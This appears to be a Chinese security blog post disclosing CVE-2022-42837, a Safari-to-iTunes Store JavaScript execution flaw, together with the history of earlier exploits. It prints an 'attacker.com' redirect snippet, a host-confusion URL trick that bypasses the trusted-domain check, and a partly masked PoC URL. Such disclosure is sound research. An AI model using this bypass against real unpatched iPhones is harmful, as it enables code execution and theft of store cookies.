# 陌陌安全获Apple致谢：CVE-2022-42837 - iTunes Store之殇

阅读量 **157862**

发布时间 : 2022-12-19 16:46:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0170a4225e8222537c.jpg)

![](https://p2.ssl.qhimg.com/t01275f5b52efbedd45.png)

先为我们的同学[@dwj1210](https://github.com/dwj1210
"@dwj1210")鼓鼓掌👏。作为围观了整个漏洞从发现到最终形成本篇文章的同学。小编前面先说一句：本次漏洞发现非常巧合，前些天给WMCTF出题的时候，dwj同学突然小声念叨好像挖到了一个RCE。于是在出完题后，我们开始了给Apple提交漏洞帮助Apple修复的漫长之路，也就有了dwj这篇文章。以下就是dwj同学的自述：

为什么这里叫做 iTunes Store 之殇，是因为 iTunes Store App 任意 javascript 代码执行的漏洞已经被修了好几次了。

该漏洞由 Safari 浏览器 中的一个恶意页面引入，当你点击一个 URL Schemes 或 Universal Links 的链接时，可以通过这个特殊的
URL 调起指定 App 并传入攻击荷载。如果在 Safari浏览器中输入`sms://`可以调起信息 App，此时会有一个弹框询问是否允许打开。

![](https://p2.ssl.qhimg.com/t018044a8f967e5293f.jpg)

但是一些内置的 Apple 应用程序是被 Safari 浏览器信任的，不会询问用户直接拉起，这些应用程序被硬编码在系统代码中：

![](https://p0.ssl.qhimg.com/t011d8e3eee10190f98.jpg)

早在 Pwn2Own 2014 年韩国黑客 lokihardt 通过一个特殊的 URL 在 iTunes Store 打开了任意的网页：

`

<script>  
location = ‘itmss://attacker.com’;  
</script>`

而 `itms://` 就是 iTunes Store 注册的 URL Scheme，由于应用程序白名单的缘故不需要向用户询问就可以直接在 iTunes
Store 中打开恶意的网页。

![](https://p2.ssl.qhimg.com/t011963fa10796340db.jpg)

此时结合一个 UAF 就完成了沙箱逃逸加任意代码执行。

后面苹果加入了域名限制，只有域名后缀满足 trustedDomains 域名列表时才会打开，但是 lokihardt 又找到了一个信任域的 DOM xss
又打了一次。

之后沉寂多年，在 2020 年天府杯上，cc 师傅凭借完整的 full chain exploit 远程破解了搭载 iOS14.2 的 iPhone11
设备。

而该漏洞利用链的第一步依然是从 Safari 到 iTunes Store，不利用内存破坏，不执行 shellcode，通过一个特殊的 URL
可以绕过域名白名单的校验执行任意的 javascript 代码，触发 xss 弹计算器。

![](https://p4.ssl.qhimg.com/t01bd5c482401a5ad63.jpg)

感兴趣的朋友可以直接研读 cc 师傅的文章：《CVE-2021-1748：从客户端 XSS 到弹计算器》
<https://codecolor.ist/2021/08/04/mistuned-part-i/>

而今天要介绍的依然是 iTunes Store 的任意 javascript 代码执行。

iTunes Store 中有一段逻辑，当传入的 URL Scheme 中有一个特殊的参数时，应用就会忽略 URL 的 host，直接加载 URL
Scheme 参数中的 URL 进行加载，比如：

`itms://<马赛克>&url=http://www.apple.com`

iTunes Store 在启动的时候会从这个URL拉取一个 XML 文件，XML 文件中的 trustedDomains 字段中预置了 Apple
的可信域名：

![](https://p2.ssl.qhimg.com/t01d14e70c15601c966.jpg)

只有页面的主机名和 trustedDomains 字段的后缀匹配，该页面才会被允许在 iTunes Store 中打开。

域名校验在`-[ISURLBag urlIsTrusted:]`函数中，但是该函数的域名校验存在缺陷。当你传入的 URL
为`http://[@www](https://github.com/www
"@www").apple.com:[@www](https://github.com/www "@www").hacker.com` 时，iOS
系统在通过 `-[NSURL host]`函数取 host 时会取到`www.apple.com`，但是实际打开的页面却是
`www.hacker.com`。据了解在 Android 平台同样存在类似的问题。

![](https://p0.ssl.qhimg.com/t0134ae64a8720e0438.jpg)

所以我们就可以构造一个这样的 URL Scheme 来绕过域名校验打开一个任意的网页：

`itms://<马赛克>&url=http%3A%2F%2F%40www.apple.com%3A%40172.16.136.27:1024%2Fpoc.html`

该漏洞目前已于 iOS16.2 修复，不清楚可用最低版本，但是 iOS9 – iOS16.1.2 应该都是可用的。由于影响范围比较大，所以提供的 PoC
隐去了部分关键参数。

iTunes Store 打开网页使用的 SUWebView 通过 JavaScript bridge 注入了许多功能；SUWebView 将
SUScriptInterface 类的方法导出到 js 上下文中。这些 API 被放在全局作用域的 iTunes 命名空间里。

![](https://p0.ssl.qhimg.com/t01003f38308f2532fd.jpg)

另外在这个 WebView 中向任意域名发送请求，都会带上部分 iTunes Store cookie 信息:

![](https://p3.ssl.qhimg.com/t016b7ace7edc59a407.jpg)

例行弹计算器：

![](https://p5.ssl.qhimg.com/t01514f3e3aeb1bd9c2.gif)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **陌陌安全** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/284452](/post/id/284452)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞，iOS16.2，代码执行，](/tag/漏洞，iOS16.2，代码执行，)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhimg.com/t012e36e1a186afffc4.png) 陌陌安全

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

